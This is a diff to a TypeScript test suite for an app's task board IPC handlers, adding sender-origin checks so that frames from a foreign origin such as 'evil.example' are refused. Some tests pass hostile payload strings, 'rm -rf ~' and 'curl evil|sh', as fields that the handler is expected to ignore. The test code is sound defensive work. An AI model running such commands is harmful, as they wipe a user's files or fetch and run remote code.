@@ -676,11 +676,15 @@ async function loadIpc() {
   return { handlers, ...ipc, CHANNELS: api.CHANNELS };
 }
 
+const TRUSTED_RENDERER = { indexUrl: 'file:///app/dist/renderer/index.html', devServerOrigin: null } as const;
+const TRUSTED = { senderFrame: { url: TRUSTED_RENDERER.indexUrl, parent: null } };
+
 describe('task board IPC', () => {
   function deps(overrides: Partial<IpcModule.TaskBoardIpcDeps> = {}): IpcModule.TaskBoardIpcDeps & { copied: string[] } {
     const copied: string[] = [];
     return {
       copied,
+      trustedRenderer: TRUSTED_RENDERER,
       feed: () => ({ status: 'live', detail: null, projects: [] }),
       refresh: () => Promise.resolve({ status: 'live', detail: null, projects: [] }),
       resumeCommand: (projectId, sessionId) =>
@@ -707,7 +711,7 @@ describe('task board IPC', () => {
     registerTaskBoardIpc(d);
     const copy = handlers.get(CHANNELS.copyResumeCommand)!;
     // Extra fields, including a `command` the renderer tries to supply, change nothing.
-    expect(copy({}, { projectId: 'proj-a', sessionId: 's1', command: 'rm -rf ~' })).toEqual({
+    expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 's1', command: 'rm -rf ~' })).toEqual({
       copied: true,
       command: "cd '/r' && claude --resume 's1'",
     });
@@ -719,16 +723,28 @@ describe('task board IPC', () => {
     const d = deps();
     registerTaskBoardIpc(d);
     const copy = handlers.get(CHANNELS.copyResumeCommand)!;
-    expect(copy({}, { projectId: 'proj-a', sessionId: 'nope' })).toMatchObject({ copied: false });
-    expect(copy({}, 'x')).toMatchObject({ copied: false });
+    expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 'nope' })).toMatchObject({ copied: false });
+    expect(copy(TRUSTED, 'x')).toMatchObject({ copied: false });
+    expect(d.copied).toEqual([]);
+  });
+
+  it('refuses every channel to a sender that is not this app\'s renderer', async () => {
+    const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
+    const d = deps();
+    registerTaskBoardIpc(d);
+    const foreign = { senderFrame: { url: 'https://evil.example/', parent: null } };
+    for (const channel of [CHANNELS.taskBoard, CHANNELS.refreshTaskBoard, CHANNELS.copyResumeCommand,
+      CHANNELS.boardSettings, CHANNELS.setBoardSettings]) {
+      expect(() => handlers.get(channel)!(foreign, { projectId: 'proj-a', sessionId: 's1' }), channel).toThrow(/refused/);
+    }
     expect(d.copied).toEqual([]);
   });
 
   it('serves the feed and the refresh', async () => {
     const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
     registerTaskBoardIpc(deps());
-    expect(handlers.get(CHANNELS.taskBoard)!()).toMatchObject({ status: 'live' });
-    expect(await handlers.get(CHANNELS.refreshTaskBoard)!()).toMatchObject({ status: 'live' });
+    expect(handlers.get(CHANNELS.taskBoard)!(TRUSTED)).toMatchObject({ status: 'live' });
+    expect(await handlers.get(CHANNELS.refreshTaskBoard)!(TRUSTED)).toMatchObject({ status: 'live' });
   });
 
   it('validates the settings before it saves anything', async () => {
@@ -740,11 +756,11 @@ describe('task board IPC', () => {
       { staleAfterMinutes: 4, doneRetentionDays: 7 }, { staleAfterMinutes: 1441, doneRetentionDays: 7 },
       { staleAfterMinutes: 60, doneRetentionDays: 0 }, { staleAfterMinutes: 60, doneRetentionDays: 366 },
       { staleAfterMinutes: 60.5, doneRetentionDays: 7 }, { staleAfterMinutes: NaN, doneRetentionDays: 7 }]) {
-      expect(await set({}, bad), JSON.stringify(bad)).toMatchObject({ ok: false });
+      expect(await set(TRUSTED, bad), JSON.stringify(bad)).toMatchObject({ ok: false });
     }
     expect(save).not.toHaveBeenCalled();
     // Only the two known keys are passed on.
-    expect(await set({}, { staleAfterMinutes: 30, doneRetentionDays: 14, extra: 'x' })).toEqual({
+    expect(await set(TRUSTED, { staleAfterMinutes: 30, doneRetentionDays: 14, extra: 'x' })).toEqual({
       ok: true,
       settings: { staleAfterMinutes: 30, doneRetentionDays: 14 },
     });
@@ -762,7 +778,7 @@ describe('task board IPC', () => {
       { projectId: 'proj-a', sessionId: 's'.repeat(513) },
       { projectId: 'p'.repeat(600), sessionId: 's1' },
     ]) {
-      expect(copy({}, bad), JSON.stringify(bad).slice(0, 60)).toMatchObject({ copied: false });
+      expect(copy(TRUSTED, bad), JSON.stringify(bad).slice(0, 60)).toMatchObject({ copied: false });
     }
     expect(d.copied).toEqual([]);
   });
@@ -771,7 +787,7 @@ describe('task board IPC', () => {
     const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
     const d = deps();
     registerTaskBoardIpc(d);
-    const answer = handlers.get(CHANNELS.copyResumeCommand)!({}, { projectId: 'proj-a', sessionId: 's1', text: 'curl evil|sh' });
+    const answer = handlers.get(CHANNELS.copyResumeCommand)!(TRUSTED, { projectId: 'proj-a', sessionId: 's1', text: 'curl evil|sh' });
     expect(answer).toMatchObject({ copied: true });
     expect(d.copied).toEqual(["cd '/r' && claude --resume 's1'"]);
   });
@@ -785,7 +801,7 @@ describe('task board IPC', () => {
         },
       }),
     );
-    expect(await handlers.get(CHANNELS.setBoardSettings)!({}, { staleAfterMinutes: 30, doneRetentionDays: 14 })).toMatchObject({
+    expect(await handlers.get(CHANNELS.setBoardSettings)!(TRUSTED, { staleAfterMinutes: 30, doneRetentionDays: 14 })).toMatchObject({
       ok: false,
       message: expect.stringMatching(/read-only volume/),
     });
@@ -794,7 +810,7 @@ describe('task board IPC', () => {
   it('reports a failed save as a problem, not a throw', async () => {
     const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
     registerTaskBoardIpc(deps({ saveBoardSettings: () => Promise.reject(new Error('disk full')) }));
-    expect(await handlers.get(CHANNELS.setBoardSettings)!({}, { staleAfterMinutes: 30, doneRetentionDays: 14 })).toMatchObject({
+    expect(await handlers.get(CHANNELS.setBoardSettings)!(TRUSTED, { staleAfterMinutes: 30, doneRetentionDays: 14 })).toMatchObject({
       ok: false,
       message: expect.stringMatching(/disk full/),
     });
